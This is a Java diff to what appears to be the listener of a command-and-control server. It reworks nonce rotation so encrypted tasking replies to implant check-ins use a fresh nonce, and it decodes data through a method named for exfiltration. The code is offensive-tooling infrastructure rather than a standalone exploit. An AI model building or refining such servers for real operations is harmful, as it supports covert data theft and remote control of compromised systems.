@@ -103,7 +103,6 @@ public class ListenerApplication {
 			else
 			{
 				sessionData = (session) epc.sessionTable.get(idCookie);
-				sessionData.nonce = napi.strand(12);
 				currentKey = sessionData.encKey;
 			}
 
@@ -111,6 +110,7 @@ public class ListenerApplication {
 			System.out.println(sessionData.nonce);
 			byte[] rawPostData = Base64.getUrlDecoder().decode(requestData.replace("=","").getBytes());
 			byte[] decryptedData = sapi.decrypt(rawPostData,sessionData.nonce.getBytes(),currentKey);
+
 
 			Hashtable xmlParsed = napi.xmlExfilToHashtable(new String(decryptedData));
 
@@ -122,15 +122,14 @@ public class ListenerApplication {
 		
 			sessionData.cookie = napi.mkCookie(idCookie, epc.passwd);
 			sessionData.lastSeen = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
-
-
-			epc.sessionTable.put(idCookie,sessionData);
+			
+			String newNonce = napi.strand(12);
 
 			System.out.println(napi.xmlDocToString(napi.outputToXmlDoc(sessionData.cookie, sessionData.encKey, sessionData.nonce, sessionData.tasks)));
 
-			String retrDoc = napi.xmlDocToString(napi.outputToXmlDoc(sessionData.cookie, sessionData.encKey, sessionData.nonce, sessionData.tasks));
+			String retrDoc = napi.xmlDocToString(napi.outputToXmlDoc(sessionData.cookie, sessionData.encKey, newNonce, sessionData.tasks));
 
-			return new String(
+			String retrData = new String(
 				Base64.getEncoder().encode(
 					sapi.encrypt(
 						retrDoc.getBytes(),
@@ -139,6 +138,13 @@ public class ListenerApplication {
 					)
 				)
 			);
+
+			sessionData.nonce = newNonce;
+
+			epc.sessionTable.put(idCookie,sessionData);
+
+
+			return retrData;
 		}
 
 		@PostMapping("/60001")
